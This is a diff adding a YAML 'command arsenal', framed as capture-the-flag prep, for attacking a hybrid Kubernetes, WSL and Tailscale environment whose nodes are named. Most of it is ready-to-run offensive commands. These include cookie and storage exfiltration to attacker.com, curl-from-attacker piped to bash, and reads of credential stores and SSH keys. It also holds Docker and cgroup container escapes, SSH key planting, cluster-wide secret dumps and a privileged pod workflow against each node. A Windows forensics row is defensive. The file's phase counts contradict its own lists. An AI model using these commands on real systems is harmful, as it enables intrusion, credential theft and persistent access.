@@ -1,0 +1,698 @@
+# ============================================================
+# REFLEXSHELL CTF COMMAND ARSENAL v1.0
+# Target: Hybrid K8s/Mesh/WSL Environment
+# Structure: 6x6 Grid (6 Domains × 6 Commands)
+# ============================================================
+
+meta:
+  version: "1.0"
+  author: "ReflexShell Automation"
+  target_env:
+    kubernetes_nodes: ["athena", "nova", "lyra", "ipower"]
+    network: "8-router-mesh-tailscale"
+    os: "windows-wsl2-mingw64"
+  phases: ["recon", "exploit", "persist", "exfil"]
+
+# ============================================================
+# DOMAIN 1: BROWSER & SERVICE WORKER EXPLOITATION
+# ============================================================
+browser_exploitation:
+  grid_position: "A1-A6"
+  
+  commands:
+    - id: A1
+      name: "sw_enumerate_all"
+      syntax: |
+        navigator.serviceWorker.getRegistrations().then(r => 
+          r.forEach(sw => console.log(sw.scope, sw.active?.scriptURL)))
+      description: "Lists all Service Worker registrations showing scope and script URLs"
+      context: "Reveals SW attack surface; find scripts intercepting requests"
+      phase: recon
+      trigger: "First action on any web CTF challenge"
+
+    - id: A2
+      name: "sw_register_malicious"
+      syntax: |
+        navigator.serviceWorker.register('/uploaded/sw.js', {scope: '/'})
+          .then(() => fetch('https://attacker.com/sw_registered'))
+      description: "Registers attacker-controlled SW to intercept all fetch events"
+      context: "Requires XSS + file upload; enables persistent request interception"
+      phase: exploit
+      trigger: "After achieving XSS with JS upload capability"
+
+    - id: A3
+      name: "cache_enumerate_dump"
+      syntax: |
+        caches.keys().then(names => names.forEach(n => 
+          caches.open(n).then(c => c.keys().then(k => console.log(n, k)))))
+      description: "Dumps all cached resources across all cache storage instances"
+      context: "Find cached credentials, tokens, or sensitive responses"
+      phase: recon
+      trigger: "Investigating PWA or offline-capable web apps"
+
+    - id: A4
+      name: "devtools_cdp_exploit"
+      syntax: |
+        ws = new WebSocket('ws://localhost:9222/devtools/page/TARGET_ID');
+        ws.onopen = () => ws.send(JSON.stringify({
+          id:1, method:'Runtime.evaluate', params:{expression:'document.cookie'}}))
+      description: "Exploits exposed Chrome DevTools Protocol for RCE"
+      context: "Common in headless browser/Puppeteer CTF challenges"
+      phase: exploit
+      trigger: "Port 9222 open; get page list from http://localhost:9222/json"
+
+    - id: A5
+      name: "antidebug_bypass"
+      syntax: |
+        console.clear = () => {};
+        window.debugger = function(){};
+        const _now = Date.now; Date.now = () => _now() - (window.__offset||0);
+      description: "Bypasses debugger traps, console.clear, and timing checks"
+      context: "Defeats JS obfuscation and anti-debugging in web challenges"
+      phase: recon
+      trigger: "Before analyzing obfuscated JS Safe challenges"
+
+    - id: A6
+      name: "fetch_intercept_all"
+      syntax: |
+        const _f = fetch; window.fetch = async (...a) => {
+          console.log('FETCH:', a);
+          const r = await _f(...a); r.clone().text().then(t=>console.log(t));
+          return r; }
+      description: "Intercepts all fetch requests and logs responses"
+      context: "Discover hidden API endpoints and authentication flows"
+      phase: recon
+      trigger: "Mapping SPA application behavior"
+
+# ============================================================
+# DOMAIN 2: BROWSER STORAGE FORENSICS
+# ============================================================
+storage_forensics:
+  grid_position: "B1-B6"
+
+  commands:
+    - id: B1
+      name: "indexeddb_full_dump"
+      syntax: |
+        indexedDB.databases().then(dbs => dbs.forEach(db => {
+          let req = indexedDB.open(db.name);
+          req.onsuccess = e => [...e.target.result.objectStoreNames].forEach(s =>
+            e.target.result.transaction(s).objectStore(s).getAll()
+              .onsuccess = r => console.log(db.name, s, r.target.result))}))
+      description: "Extracts all data from every IndexedDB database and store"
+      context: "Critical for Teams/Slack/WhatsApp Web forensics challenges"
+      phase: exfil
+      trigger: "Web forensics involving chat apps or PWAs"
+
+    - id: B2
+      name: "storage_complete_dump"
+      syntax: |
+        console.log('LOCAL:', {...localStorage});
+        console.log('SESSION:', {...sessionStorage});
+        console.log('COOKIES:', document.cookie);
+      description: "Dumps LocalStorage, SessionStorage, and accessible cookies"
+      context: "Reveals session tokens, flags, cached authentication data"
+      phase: recon
+      trigger: "Initial enumeration on any web challenge"
+
+    - id: B3
+      name: "cookie_exfil_xss"
+      syntax: |
+        fetch('https://attacker.com/steal', {
+          method: 'POST', mode: 'no-cors',
+          body: JSON.stringify({c: document.cookie, l: {...localStorage}})})
+      description: "Exfiltrates cookies and storage via XSS to attacker server"
+      reference: "https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies"
+      context: "Note: HttpOnly cookies won't appear in document.cookie"
+      phase: exfil
+      trigger: "After achieving XSS; for cookie stealing"
+
+    - id: B4
+      name: "storage_export_json"
+      syntax: |
+        JSON.stringify({
+          localStorage: {...localStorage},
+          sessionStorage: {...sessionStorage},
+          cookies: document.cookie,
+          origin: location.origin,
+          timestamp: new Date().toISOString()
+        }, null, 2)
+      description: "Creates forensic JSON snapshot of all browser storage"
+      context: "Structured export for offline analysis or reporting"
+      phase: exfil
+      trigger: "Creating evidence snapshot for forensic challenges"
+
+    - id: B5
+      name: "sw_scope_check"
+      syntax: |
+        navigator.serviceWorker.getRegistration('/api').then(r => 
+          r ? console.log('SW:', r.active.scriptURL, r.updateViaCache) 
+            : console.log('No SW for scope'))
+      description: "Checks if specific URL path is under SW control"
+      context: "Verify scope before attempting SW exploitation"
+      phase: recon
+      trigger: "Before targeting specific endpoints for SW attacks"
+
+    - id: B6
+      name: "cache_poison_response"
+      syntax: |
+        // Inside malicious SW:
+        self.addEventListener('fetch', e => {
+          if (e.request.url.includes('target.js'))
+            e.respondWith(new Response('alert("XSS")', 
+              {headers: {'Content-Type': 'application/javascript'}}))})
+      description: "SW cache poisoning to serve malicious content"
+      context: "Turns reflected XSS into persistent XSS via SW cache"
+      phase: persist
+      trigger: "After registering malicious SW; for persistence"
+
+# ============================================================
+# DOMAIN 3: WINDOWS PROCESS FORENSICS
+# ============================================================
+windows_forensics:
+  grid_position: "C1-C6"
+
+  commands:
+    - id: C1
+      name: "process_tree_full"
+      syntax: |
+        Get-CimInstance Win32_Process | Select ProcessId, ProcessName, 
+          ParentProcessId, CommandLine | Sort ParentProcessId
+      description: "Maps complete process tree with command-line arguments"
+      context: "Detect injection chains; suspicious parent-child (conhost from lsass)"
+      phase: recon
+      trigger: "Initial triage on Windows forensics challenges"
+
+    - id: C2
+      name: "dll_injection_detect"
+      syntax: |
+        (Get-Process -Name "TARGET").Modules | 
+          Where {$_.FileName -notmatch "C:\\Windows\\"} | 
+          Select ModuleName, FileName
+      description: "Lists non-system DLLs loaded by process"
+      context: "Detects DLL injection; CLR/clrjit.dll in non-.NET = injection"
+      phase: recon
+      trigger: "Suspicious process identified; checking for injection"
+
+    - id: C3
+      name: "netstat_process_map"
+      syntax: |
+        Get-NetTCPConnection | Where {$_.State -eq 'Established'} | 
+          Select LocalPort, RemoteAddress, RemotePort, 
+          @{N='Process';E={(Get-Process -Id $_.OwningProcess).ProcessName}}
+      description: "Maps network connections to process names"
+      context: "Identify C2 beacons; docker/claude.exe unexpected connections"
+      phase: recon
+      trigger: "Hunting for network-active malware or exfil channels"
+
+    - id: C4
+      name: "powershell_history_extract"
+      syntax: |
+        Get-Content (Get-PSReadLineOption).HistorySavePath
+      description: "Extracts PowerShell command history across sessions"
+      context: "Recovers attacker commands even after terminal close"
+      phase: recon
+      trigger: "Forensics requiring PowerShell activity reconstruction"
+
+    - id: C5
+      name: "scriptblock_logs_decode"
+      syntax: |
+        Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; 
+          Id=4104} | Select TimeCreated, Message | Format-List
+      description: "Extracts PowerShell script block logs (Event ID 4104)"
+      context: "Reveals decoded payloads even from -EncodedCommand execution"
+      phase: recon
+      trigger: "Investigating obfuscated PowerShell attacks"
+
+    - id: C6
+      name: "sysmon_injection_hunt"
+      syntax: |
+        Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational | 
+          Where {$_.Id -eq 8} | Select TimeCreated, Message
+      description: "Queries Sysmon for CreateRemoteThread events (ID 8)"
+      context: "Detects process injection via remote thread creation"
+      phase: recon
+      trigger: "Hunting for process injection artifacts"
+
+# ============================================================
+# DOMAIN 4: WSL/MINGW64 HYBRID PIVOTING
+# ============================================================
+wsl_pivot:
+  grid_position: "D1-D6"
+
+  commands:
+    - id: D1
+      name: "wsl_read_windows_files"
+      syntax: |
+        cat /mnt/c/Users/*/AppData/Local/Microsoft/Credentials/*
+        cat /mnt/c/Users/*/.ssh/id_rsa
+      description: "Access Windows credentials and SSH keys from WSL"
+      context: "Cross-environment credential harvesting"
+      phase: exfil
+      trigger: "WSL shell access; pivoting to Windows secrets"
+
+    - id: D2
+      name: "wsl_exec_windows_cmd"
+      syntax: |
+        /mnt/c/Windows/System32/cmd.exe /c "whoami && net user"
+        powershell.exe -Command "Get-Process | Select Name,Path"
+      description: "Execute Windows commands from WSL context"
+      context: "Evades Windows-only security monitoring"
+      phase: exploit
+      trigger: "WSL access; need Windows command execution"
+
+    - id: D3
+      name: "windows_to_wsl_lolbin"
+      syntax: |
+        wsl.exe -e curl -s http://attacker.com/payload.sh | bash
+        wsl.exe bash -c "cat /etc/shadow"
+      description: "Uses wsl.exe as LOLBIN to bypass application whitelisting"
+      context: "Windows shells via bash.exe/wsl.exe leave minimal audit logs"
+      phase: exploit
+      trigger: "AWL bypass needed; have Windows command execution"
+
+    - id: D4
+      name: "wsl_filesystem_from_windows"
+      syntax: |
+        dir \\wsl$\Ubuntu\home\user\.ssh\
+        type \\wsl$\Ubuntu\home\user\.bash_history
+      description: "Access WSL filesystem from Windows via UNC path"
+      context: "Read Linux credentials/history from Windows context"
+      phase: recon
+      trigger: "Windows access; investigating WSL environment"
+
+    - id: D5
+      name: "mingw_cross_compile"
+      syntax: |
+        x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
+        i686-w64-mingw32-gcc payload.c -o payload32.exe
+      description: "Cross-compile Windows exploits from Linux/Kali"
+      reference: "https://null-byte.wonderhowto.com/how-to/use-mingw-compile-windows-exploits-kali-linux-0179461/"
+      context: "Build custom Windows payloads from attack box"
+      phase: exploit
+      trigger: "Need Windows binary but only have Linux dev env"
+
+    - id: D6
+      name: "wsl_socks_pivot"
+      syntax: |
+        # From WSL:
+        ssh -D 1080 -N user@$(hostname -I | awk '{print $1}') &
+        export ALL_PROXY=socks5://127.0.0.1:1080
+      description: "Establish SOCKS proxy through WSL for network pivoting"
+      context: "Route traffic through WSL's network namespace"
+      phase: persist
+      trigger: "Need covert channel or network pivot via WSL"
+
+# ============================================================
+# DOMAIN 5: IPv6 & TAILSCALE MESH RECONNAISSANCE  
+# ============================================================
+network_recon:
+  grid_position: "E1-E6"
+
+  commands:
+    - id: E1
+      name: "ipv6_multicast_discover"
+      syntax: |
+        ping6 -I eth0 ff02::1 && ip -6 neigh
+      description: "Discovers IPv6 hosts via all-nodes multicast then shows cache"
+      context: "ff02::1 = all nodes; ff02::2 = all routers"
+      reference: "https://docs.h4rithd.com/tools/network-enumeration"
+      phase: recon
+      trigger: "Initial IPv6 network mapping"
+
+    - id: E2
+      name: "nmap_ipv6_linklocal"
+      syntax: |
+        nmap -6 -sV -sC fe80::1%eth0
+        nmap -6 --script=broadcast-icmp6-echo eth0
+      description: "Scans IPv6 link-local addresses with version detection"
+      context: "%interface required for fe80:: addresses; IPv6 firewalls often weaker"
+      phase: recon
+      trigger: "Port scanning fe80:: addresses from neighbor discovery"
+
+    - id: E3
+      name: "thc_ipv6_alive"
+      syntax: |
+        atk6-alive6 eth0
+        atk6-alive6 eth0 -e ff02::1
+      description: "Fast stealthy IPv6 host discovery via ICMPv6"
+      context: "Part of thc-ipv6 toolkit; more covert than ping sweeps"
+      phase: recon
+      trigger: "Need fast IPv6 enumeration without noise"
+
+    - id: E4
+      name: "tshark_ipv6_filter"
+      syntax: |
+        tshark -i eth0 -f "ip6" -Y "icmpv6.type == 134 or icmpv6.type == 136"
+        tshark -r cap.pcap -Y "ipv6.src contains fe80::"
+      description: "Captures IPv6 traffic filtering for NDP messages"
+      context: "Type 134=Router Advert, 135=Neighbor Solicit, 136=Neighbor Advert"
+      phase: recon
+      trigger: "Passive IPv6 traffic analysis"
+
+    - id: E5
+      name: "tailscale_node_enum"
+      syntax: |
+        tailscale status --json | jq '.Peer[] | {host: .HostName, ip: .TailscaleIPs, relay: .Relay}'
+      description: "Enumerates all tailnet nodes with IPs and connection type"
+      context: "Shows direct vs DERP relay; maps 100.x.y.z mesh addresses"
+      reference: "https://tailscale.com/kb/1023/troubleshooting"
+      phase: recon
+      trigger: "First action on tailscale network CTF"
+
+    - id: E6
+      name: "tailscale_magicdns_recon"
+      syntax: |
+        tailscale dns status
+        dig @100.100.100.100 hostname.tailnet.ts.net
+        tailscale status --json | jq '.MagicDNSSuffix'
+      description: "Queries MagicDNS for node discovery"
+      context: "100.100.100.100 is MagicDNS resolver on every node"
+      reference: "https://tailscale.com/blog/2021-09-private-dns-with-magicdns"
+      phase: recon
+      trigger: "Enumerating tailnet via DNS queries"
+
+# ============================================================
+# DOMAIN 6: KUBERNETES & CONTAINER ESCAPE
+# ============================================================
+container_k8s:
+  grid_position: "F1-F6"
+
+  commands:
+    - id: F1
+      name: "docker_socket_escape"
+      syntax: |
+        docker -H unix:///var/run/docker.sock run -it --privileged \
+          --net=host -v /:/mnt alpine chroot /mnt /bin/bash
+      description: "Escapes container via mounted Docker socket"
+      reference: "https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/docker-breakout"
+      context: "Check: find / -name docker.sock 2>/dev/null"
+      phase: exploit
+      trigger: "docker.sock found mounted in container"
+
+    - id: F2
+      name: "cgroup_release_agent_escape"
+      syntax: |
+        d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null|head -n1))
+        mkdir -p $d/w; echo 1 > $d/w/notify_on_release
+        t=$(sed -n 's/.*perdir=\([^,]*\).*/\1/p' /etc/mtab)
+        echo "$t/c" > $d/release_agent; printf '#!/bin/sh\nid > '"$t"'/out' > /c
+        chmod +x /c; sh -c "echo 0 > $d/w/cgroup.procs"; cat /out
+      description: "Privileged container escape via cgroups release_agent"
+      context: "Works with CAP_SYS_ADMIN or --privileged; executes on host"
+      references:
+        - "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"
+        - "https://juggernaut-sec.com/docker-breakout-lpe/"
+      phase: exploit
+      trigger: "Privileged container; capsh --print shows sys_admin"
+
+    - id: F3
+      name: "hostdisk_mount_escape"
+      syntax: |
+        fdisk -l                    # Find /dev/sda5 or similar
+        mkdir /mnt/h; mount /dev/sda5 /mnt/h
+        echo "ssh-rsa AAAA..." >> /mnt/h/root/.ssh/authorized_keys
+      description: "Mounts host disk from privileged container for full access"
+      reference: "https://juggernaut-sec.com/docker-breakout-lpe/"
+      context: "Plant SSH keys, backdoors, or extract /etc/shadow"
+      phase: exploit
+      trigger: "Privileged container; need persistent host access"
+
+    - id: F4
+      name: "k8s_sa_token_extract"
+      syntax: |
+        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+        APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
+        kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
+          auth can-i --list
+      description: "Extracts pod's service account token and checks permissions"
+      references:
+        - "https://book.jorianwoltjer.com/cloud/kubernetes"
+        - "https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration"
+        - "https://hacktricks.boitatech.com.br/pentesting/pentesting-kubernetes/enumeration-from-a-pod"
+      context: "Every pod gets SA token by default; check what it can do"
+      phase: recon
+      trigger: "Inside any K8s pod; initial enumeration"
+
+    - id: F5
+      name: "k8s_secrets_dump"
+      syntax: |
+        kubectl get secrets --all-namespaces -o yaml
+        kubectl get secret NAME -o jsonpath='{.data}' | \
+          jq -r 'to_entries[]|"\(.key): \(.value|@base64d)"'
+      description: "Extracts and decodes Kubernetes secrets cluster-wide"
+      reference: "https://hacktricks.boitatech.com.br/pentesting/pentesting-kubernetes"
+      context: "Contains DB passwords, API keys, cloud credentials"
+      phase: exfil
+      trigger: "Have 'get secrets' RBAC permission"
+
+    - id: F6
+      name: "k8s_node_pwn_pod"
+      syntax: |
+        kubectl apply -f - <<EOF
+        apiVersion: v1
+        kind: Pod
+        metadata: {name: pwn}
+        spec:
+          hostNetwork: true
+          hostPID: true
+          nodeName: athena  # or nova, lyra, ipower
+          containers:
+          - name: pwn
+            image: alpine
+            securityContext: {privileged: true}
+            command: ["chroot", "/host", "/bin/bash"]
+            volumeMounts: [{mountPath: /host, name: root}]
+          volumes:
+          - {name: root, hostPath: {path: /}}
+        EOF
+      description: "Creates privileged pod on specific node with full host access"
+      context: "Target specific nodes: athena, nova, lyra, ipower"
+      phase: exploit
+      trigger: "Have pod create permission; need node-level access"
+
+# ============================================================
+# MUSCLE MEMORY GRID REFERENCE (6×6)
+# ============================================================
+quick_reference:
+  description: "Visual 6x6 grid for rapid command recall"
+  
+  grid: |
+    ┌─────────────────┬─────────────────┬─────────────────┬─────────────────┬─────────────────┬─────────────────┐
+    │ A1: SW Enum     │ A2: SW Register │ A3: Cache Dump  │ A4: CDP Exploit │ A5: AntiDebug   │ A6: Fetch Hook  │
+    │ getRegistrations│ register('/sw') │ caches.keys()   │ ws://9222/      │ debugger=()=>{} │ window.fetch=   │
+    │ [RECON]         │ [EXPLOIT]       │ [RECON]         │ [EXPLOIT]       │ [RECON]         │ [RECON]         │
+    ├─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┤
+    │ B1: IDB Dump    │ B2: Storage All │ B3: Cookie Exfil│ B4: JSON Export │ B5: Scope Check │ B6: Cache Poison│
+    │ indexedDB.dbs() │ {...localStorage│ fetch(attacker) │ JSON.stringify  │ getRegistration │ respondWith()   │
+    │ [EXFIL]         │ [RECON]         │ [EXFIL]         │ [EXFIL]         │ [RECON]         │ [PERSIST]       │
+    ├─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┤
+    │ C1: Proc Tree   │ C2: DLL Detect  │ C3: Net-Proc Map│ C4: PS History  │ C5: ScriptBlock │ C6: Sysmon Hunt │
+    │ Get-CimInstance │ .Modules|Where  │ Get-NetTCP      │ HistorySavePath │ EventId=4104    │ EventId=8       │
+    │ [RECON]         │ [RECON]         │ [RECON]         │ [RECON]         │ [RECON]         │ [RECON]         │
+    ├─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┤
+    │ D1: WSL Creds   │ D2: WSL→Win Cmd │ D3: Win→WSL LOL │ D4: \\wsl$ Path │ D5: MinGW Cross │ D6: SOCKS Pivot │
+    │ /mnt/c/Users/   │ powershell.exe  │ wsl.exe -e curl │ \\wsl$\Ubuntu\  │ x86_64-mingw32  │ ssh -D 1080     │
+    │ [EXFIL]         │ [EXPLOIT]       │ [EXPLOIT]       │ [RECON]         │ [EXPLOIT]       │ [PERSIST]       │
+    ├─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┤
+    │ E1: IPv6 Disco  │ E2: Nmap IPv6   │ E3: alive6      │ E4: tshark IPv6 │ E5: TS Nodes    │ E6: MagicDNS    │
+    │ ping6 ff02::1   │ nmap -6 fe80::% │ atk6-alive6     │ -Y "icmpv6"     │ tailscale status│ @100.100.100.100│
+    │ [RECON]         │ [RECON]         │ [RECON]         │ [RECON]         │ [RECON]         │ [RECON]         │
+    ├─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┤
+    │ F1: Docker Sock │ F2: cgroup Esc  │ F3: Disk Mount  │ F4: SA Token    │ F5: K8s Secrets │ F6: Node Pwn    │
+    │ docker -H unix: │ release_agent   │ mount /dev/sda  │ /serviceaccount │ get secrets -o  │ nodeName:athena │
+    │ [EXPLOIT]       │ [EXPLOIT]       │ [EXPLOIT]       │ [RECON]         │ [EXFIL]         │ [EXPLOIT]       │
+    └─────────────────┴─────────────────┴─────────────────┴─────────────────┴─────────────────┴─────────────────┘
+
+  phase_counts:
+    recon: 18
+    exploit: 12  
+    persist: 3
+    exfil: 5
+
+  row_mnemonics:
+    A: "Service Workers intercept everything"
+    B: "IDB holds the secrets, export JSON"
+    C: "CimInstance → DLLs → NetTCP → History → Logs → Sysmon"
+    D: "/mnt/c goes both ways, MinGW bridges, SOCKS tunnels"
+    E: "ping6 multicast → nmap -6 → alive6 → tshark → tailscale"
+    F: "Socket → cgroups → disk → token → secrets → nodeName"
+
+# ============================================================
+# PHASE-BASED QUICK ACCESS
+# ============================================================
+by_phase:
+  recon:
+    description: "18 commands for enumeration and discovery (50%)"
+    commands:
+      - A1   # SW enumerate
+      - A3   # Cache dump
+      - A5   # Anti-debug bypass
+      - A6   # Fetch intercept
+      - B2   # Storage dump
+      - B5   # SW scope check
+      - C1   # Process tree
+      - C2   # DLL detection
+      - C3   # Network-process mapping
+      - C4   # PowerShell history
+      - C5   # Script block logs
+      - C6   # Sysmon injection hunt
+      - D4   # WSL filesystem from Windows
+      - E1   # IPv6 multicast discovery
+      - E2   # Nmap IPv6
+      - E3   # alive6
+      - E4   # tshark IPv6
+      - E5   # Tailscale node enum
+      - E6   # MagicDNS recon
+      - F4   # SA token extract
+    
+  exploit:
+    description: "12 commands forming your attack toolkit"
+    commands:
+      - A2   # SW register malicious
+      - A4   # CDP WebSocket exploit
+      - D2   # WSL exec Windows commands
+      - D3   # LOLBIN bypass
+      - D5   # MinGW cross-compile
+      - F1   # Docker socket escape
+      - F2   # cgroups escape
+      - F3   # Host disk mount
+      - F6   # Node pwn pod
+    
+  persist:
+    description: "3 commands for maintaining access"
+    commands:
+      - B6   # Cache poison
+      - D6   # SOCKS pivot
+      - F3   # SSH key plant (via disk mount)
+    
+  exfil:
+    description: "5 commands for data extraction"
+    commands:
+      - B1   # IndexedDB dump
+      - B3   # Cookie exfil
+      - B4   # JSON export
+      - D1   # WSL credential access
+      - F5   # K8s secrets dump
+
+# ============================================================
+# ENVIRONMENT-SPECIFIC WORKFLOWS
+# ============================================================
+workflows:
+  k8s_cluster_compromise:
+    description: "Progression through your 4-node cluster"
+    nodes: ["athena", "nova", "lyra", "ipower"]
+    steps:
+      - command: F4
+        description: "Extract SA token from initial pod"
+      - command: F5
+        description: "Dump secrets if permitted"
+      - command: F6
+        description: "Create privileged pod on athena"
+        target: "athena"
+      - command: F3
+        description: "Mount host disk, plant SSH keys"
+      - command: F6
+        description: "Repeat for nova"
+        target: "nova"
+      - command: F6
+        description: "Repeat for lyra"
+        target: "lyra"
+      - command: F6
+        description: "Repeat for ipower"
+        target: "ipower"
+    
+  browser_forensics_flow:
+    description: "Complete web storage extraction"
+    steps:
+      - command: A1
+        description: "Enumerate Service Workers"
+      - command: B2
+        description: "Dump all storage"
+      - command: B1
+        description: "Deep IndexedDB extraction"
+      - command: B4
+        description: "Export as JSON"
+      - command: B3
+        description: "Exfil if XSS available"
+
+  hybrid_pivot_flow:
+    description: "Windows ↔ WSL pivoting chain"
+    steps:
+      - command: D4
+        description: "Enumerate WSL from Windows"
+      - command: D2
+        description: "Exec Windows from WSL"
+      - command: D1
+        description: "Extract credentials"
+      - command: D6
+        description: "Establish SOCKS pivot"
+      - command: D3
+        description: "LOLBIN for persistence"
+
+  ipv6_mesh_recon:
+    description: "IPv6 + Tailscale network mapping"
+    steps:
+      - command: E1
+        description: "IPv6 multicast discovery"
+      - command: E3
+        description: "alive6 enumeration"
+      - command: E2
+        description: "Nmap service scan"
+      - command: E5
+        description: "Tailscale node mapping"
+      - command: E6
+        description: "MagicDNS enumeration"
+
+# ============================================================
+# DETECTION CHECKS (Run First)
+# ============================================================
+detection_checks:
+  container_context:
+    check: "cat /proc/1/cgroup | grep -q docker && echo 'CONTAINER'"
+    privileged: "ip link add dummy0 type dummy 2>/dev/null && echo 'PRIVILEGED'"
+    description: "Determine if running in container and privilege level"
+    
+  k8s_context:
+    check: "ls /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null"
+    description: "Verify Kubernetes pod context"
+    
+  wsl_context:
+    from_wsl: "grep -q WSL /proc/version && echo 'WSL'"
+    from_windows: "wsl.exe --list --verbose"
+    description: "Detect WSL environment from both sides"
+    
+  tailscale_context:
+    check: "tailscale status >/dev/null 2>&1 && echo 'TAILSCALE'"
+    description: "Verify tailscale daemon availability"
+
+# ============================================================
+# MEMORIZATION STRATEGY
+# ============================================================
+memorization:
+  strategy: "The 6×6 grid structure leverages spatial memory—each domain occupies a row (A-F), and command variations flow left-to-right from enumeration to exploitation"
+  
+  practice_method: "Practice by covering the bottom of each cell and recalling the full syntax from the mnemonic header"
+  
+  distribution_insight: "The phase distribution shows 18 commands are recon (50%)—this reflects CTF reality where enumeration determines success. The 12 exploit commands form your attack toolkit, while persist and exfil commands (8 total) enable competition endurance and flag extraction."
+  
+  spatial_organization:
+    rows:
+      - letter: A
+        domain: "Browser Exploitation"
+        mnemonic: "Service Workers intercept everything"
+      - letter: B
+        domain: "Storage Forensics"
+        mnemonic: "IDB holds the secrets, export JSON"
+      - letter: C
+        domain: "Windows Forensics"
+        mnemonic: "CimInstance → DLLs → NetTCP → History → Logs → Sysmon"
+      - letter: D
+        domain: "WSL Pivot"
+        mnemonic: "/mnt/c goes both ways, MinGW bridges, SOCKS tunnels"
+      - letter: E
+        domain: "Network Recon"
+        mnemonic: "ping6 multicast → nmap -6 → alive6 → tshark → tailscale"
+      - letter: F
+        domain: "K8s/Container"
+        mnemonic: "Socket → cgroups → disk → token → secrets → nodeName"
